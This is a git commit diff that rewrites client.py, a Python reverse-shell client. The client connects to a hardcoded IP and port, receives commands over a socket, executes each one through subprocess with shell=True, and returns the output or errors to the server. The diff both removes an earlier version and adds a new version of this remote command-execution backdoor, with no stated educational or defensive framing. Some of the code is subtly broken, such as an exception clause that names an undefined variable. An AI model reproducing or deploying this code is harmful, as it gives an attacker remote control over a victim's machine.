f48fa7f1f96d9f7b8ef78f5381b3d9d5f4d6514f
Alvsch <94403567+Alvsch@users.noreply.github.com>
2022-03-19 18:37:15 +0100

    Update client.py
    Rewritten All Code

--- client.py
+++ client.py
@@ -1,35 +1,80 @@
 import socket
 import subprocess
 
-HEADER = 64
+HEADER = 16
+FORMAT = "utf-8"
+
+IP = "192.168.86.26"
 PORT = 5555
-IP = "192.168.86.222"
 ADDR = (IP, PORT)
-FORMAT = 'utf-8'
+
+class Network:
+    def __init__(self, conn):
+        self.conn = conn
+
+    #Client
+    def recv_handler(self, msg):
+        msg = str(msg)
+        args = msg.split(" ")
+        command = args.pop(0).upper()
+
+        return command, args
+
+    def recv(self):
+        msg_length = self.conn.recv(HEADER).decode(FORMAT)
+        if msg_length:
+            msg_length = int(msg_length)
+            msg = self.conn.recv(msg_length).decode(FORMAT)
+            return msg
+
+    def send_handler(self, command, args):
+        command = str(command)
+        return self.send(command + " " + args)
+
+    def send(self, msg):
+        msg = str(msg)
+        message = msg.encode(FORMAT)
+        msg_length = len(message)
+        send_length = str(msg_length).encode(FORMAT)
+        send_length += b" " * (HEADER - len(send_length))
+        self.conn.send(send_length)
+        self.conn.send(message)
+
+
+    def close_conn(self):
+        self.conn.close()
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(ADDR)
+try:
+    client.connect(ADDR)
+except:
+    print("Could Not Connect To Server")
 
-def recv(conn):
-    msg_length = conn.recv(HEADER).decode(FORMAT)
-    if msg_length:
-        msg_length = int(msg_length)
-        msg = conn.recv(msg_length).decode(FORMAT)
-        return msg
-
-def send(msg, conn):
-    message = msg.encode(FORMAT)
-    msg_length = len(message)
-    send_length = str(msg_length).encode(FORMAT)
-    send_length += b' ' * (HEADER - len(send_length))
-    conn.send(send_length)
-    conn.send(message)
-
+n = Network(client)
 
 connected = True
 while connected:
-    msg = recv(client)
+    try:
+        msg = n.recv()
+        msg = n.recv_handler(msg)
+        command = msg[0]
+        args = msg[1]
 
-    proc = subprocess.Popen(msg.split(" "), stdout=subprocess.PIPE, shell=True)
-    (out, err) = proc.communicate()
-    send(str(out), client)
+        if command == "GET_CWD":
+            proc = subprocess.Popen("cd", stdout=subprocess.PIPE, shell=True)
+            (out, err) = proc.communicate()
+            n.send_handler("CWD", str(out))
+        else:
+            proc = subprocess.Popen("".join(args), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, )
+            (out, err) = proc.communicate()
+            err = str(err)
+            if err != "b''":
+                err = err.replace("\"", "\'")
+                n.send_handler("OUTPUT", str(err))
+            else:
+                n.send_handler("OUTPUT", str(out))
+    except err:
+        print("Connection Lost")
+        print(err)
+        connected = False
+        n.close_conn()
